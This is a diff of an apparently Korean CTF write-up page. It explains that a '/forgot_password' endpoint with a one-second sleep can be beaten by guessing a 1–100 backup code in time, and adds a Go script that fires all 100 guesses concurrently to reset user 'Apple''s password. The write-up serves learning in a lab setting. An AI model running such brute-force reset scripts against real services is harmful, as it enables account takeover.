@@ -134,9 +134,39 @@ if (!doNotTrack) {
 <blockquote>
 <p>제공하는 app.py만 잘 해석하면 풀 수 있는 문제였다. <!-- raw HTML omitted -->
 &lsquo;/forgot_password&rsquo;에 &ldquo;time.sleep(1)&rdquo; 구문이 있는데 1초안에 1~100까지 랜덤으로 생성되는 backupCode를 요청하면되었다. <!-- raw HTML omitted -->
-python으로 간단히 요청 코드를 작성하면 해결된다.</p>
+python으로 간단히 요청 코드를 작성하면 해결된다.
+아래는 go 연습할겸 만든 코드 아래코드로 시도해도된당</p>
 </blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
 
+<span class="kn">import</span> <span class="p">(</span>
+	<span class="s">&#34;fmt&#34;</span>
+	<span class="s">&#34;net/http&#34;</span>
+	<span class="s">&#34;net/url&#34;</span>
+	<span class="s">&#34;runtime&#34;</span>
+	<span class="s">&#34;strconv&#34;</span>
+	<span class="s">&#34;time&#34;</span>
+<span class="p">)</span>
+
+<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="nx">runtime</span><span class="p">.</span><span class="nf">GOMAXPROCS</span><span class="p">(</span><span class="nx">runtime</span><span class="p">.</span><span class="nf">NumCPU</span><span class="p">()</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span>
+	<span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">100</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
+		<span class="k">go</span> <span class="nf">postRequst</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="kd">func</span> <span class="nf">postRequst</span><span class="p">(</span><span class="nx">i</span> <span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">backupCode</span> <span class="o">:=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Itoa</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
+	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">backupCode</span> <span class="o">+</span> <span class="s">&#34;번째시도&#34;</span><span class="p">)</span>
+	<span class="nx">resp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nf">PostForm</span><span class="p">(</span><span class="s">&#34;&lt;문제URL&gt;/forgot_password&#34;</span><span class="p">,</span>
+		<span class="nx">url</span><span class="p">.</span><span class="nx">Values</span><span class="p">{</span><span class="s">&#34;userid&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s">&#34;Apple&#34;</span><span class="p">},</span> <span class="s">&#34;newpassword&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s">&#34;Apple&#34;</span><span class="p">},</span> <span class="s">&#34;backupCode&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nx">backupCode</span><span class="p">}})</span>
+	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="k">defer</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+<span class="p">}</span>
+</code></pre></div>
 </section>
 
 
